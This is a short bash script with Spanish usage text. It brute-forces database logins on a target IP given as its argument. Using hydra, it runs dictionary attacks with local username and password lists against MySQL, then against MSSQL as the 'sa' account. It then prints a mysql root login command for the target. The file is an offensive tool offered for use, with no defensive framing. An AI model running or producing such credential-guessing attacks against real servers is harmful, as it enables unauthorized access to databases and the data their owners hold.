#!/bin/bash
cat << "INFO"

MySQL -

INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a MySQL en 3306/TCP."
        echo "Requiere nmap"
        echo "Uso.: sh brutemysql2.sh <ip>"
        echo
        exit 0
fi
echo
echo

hydra -L usuarios0.txt -P claves0.txt $1 mysql
hydra -l sa -P usuarios.txt $1 mssql
echo
echo "mysql -h $1 -u root -p "
echo

